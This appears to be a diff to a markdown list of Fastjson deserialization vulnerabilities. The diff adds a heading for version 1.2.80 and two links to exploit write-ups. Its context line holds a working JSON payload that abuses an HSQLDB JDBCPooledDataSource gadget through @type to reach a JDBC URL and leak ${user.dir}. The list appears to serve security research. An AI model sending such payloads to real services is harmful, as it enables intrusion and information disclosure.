@@ -1269,3 +1269,10 @@ https://b1ue.cn/archives/458.html
 ```
 {"@type":"org.hsqldb.jdbc.pool.JDBCPooledDataSource","url":"jdbc:hsqldb:http://127.0.0.1:2333/?${user.dir}","user":"sa","password":"","a":{"$ref":"$.pooledConnection"}}
 ```
+## fastjson 1.2.80
+https://github.com/hosch3n/FastjsonVulns
+
+https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/
+
+
+
